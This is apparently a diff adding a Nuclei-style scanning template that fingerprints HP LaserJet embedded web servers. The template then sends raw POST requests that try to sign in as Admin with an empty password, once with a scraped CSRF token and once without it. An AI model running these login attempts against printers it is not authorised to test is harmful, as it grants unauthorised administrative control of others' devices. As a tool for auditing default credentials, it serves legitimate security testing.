@@ -1,0 +1,126 @@
+id: hp-device-signin-multi
+
+info:
+  name: HP LaserJet Admin/No Password Sign-In (Multiple Methods)
+  author: n0ur5
+  severity: medium
+  description: |
+    This template attempts two different authentication methods for HP printers:
+    1. Uses a CSRF token for login.
+    2. If the first attempt fails, tries login without a CSRF token.
+    This ensures only valid HP devices are matched and prevents false positives.
+  tags: csrf, auth, hp, web
+  reference:
+    - "Requires -tlsi flag to function properly."
+
+http:
+  - raw:
+      - |
+        GET /hp/device/SignIn/Index HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Referer: https://{{Hostname}}/
+        Upgrade-Insecure-Requests: 1
+        Connection: keep-alive
+
+    max-redirects: 5  # Follow redirects
+
+    matchers-condition: and  # Require all conditions to be met
+
+    matchers:
+      - type: status
+        status:
+          - 200  # Ensure the GET request is valid (prevents false positives on 404)
+
+      - type: word
+        part: header
+        words:
+          - "Server: HP_Compact_Server"
+
+      - type: word
+        part: body
+        words:
+          - "<title>HP LaserJet"
+          - "HP Embedded Web Server"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        internal: true
+        group: 1
+        regex:
+          - '<input\s+type="hidden"\s+id="CSRFToken"\s+name="CSRFToken"\s+value="([^"]+)"'
+          - 'var CSRFToken = "([^"]+)";'  # Handle both inline and script-based CSRF tokens
+
+      - type: regex
+        name: session_id
+        internal: true
+        group: 1
+        part: header
+        regex:
+          - "(?i)Set-Cookie:\\s*sessionId=([a-f0-9]+)"
+
+    stop-at-first-match: false  # Ensure both CSRF token and session ID are extracted
+
+  - raw:
+      - |
+        POST /hp/device/SignIn/Index HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: sessionId={{session_id}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Content-Type: application/x-www-form-urlencoded
+        Connection: keep-alive
+
+        CSRFToken={{csrf_token}}&agentIdSelect=hp_EmbeddedPin_v1&PinDropDown=AdminItem&PasswordTextBox=&signInOk=Sign+In
+
+    matchers-condition: or  # Match if either login attempt succeeds
+
+    matchers:
+      - type: status
+        status:
+          - 302  # Ensure login results in a redirect
+
+      - type: regex
+        part: header
+        regex:
+          - "^Location: (/hp/device/DeviceStatus/Index|https?://{{Hostname}}/hp/device/DeviceStatus/Index)$"  # Match both relative and absolute redirects
+
+  - raw:
+      - |
+        POST /hp/device/SignIn/Index HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: sessionId={{session_id}}
+        Origin: https://{{Hostname}}
+        Referer: https://{{Hostname}}/hp/device/SignIn/Index
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-User: ?1
+        Priority: u=0, i
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Connection: keep-alive
+
+        agentIdSelect=hp_EmbeddedPin_v1&PinDropDown=AdminItem&PasswordTextBox=&signInOk=Sign+In
+
+    matchers-condition: or  # Match if either login attempt succeeds
+
+    matchers:
+      - type: status
+        status:
+          - 302  # Ensure login results in a redirect
+
+      - type: regex
+        part: header
+        regex:
+          - "^Location: (/hp/device/DeviceStatus/Index|https?://{{Hostname}}/hp/device/DeviceStatus/Index)$"
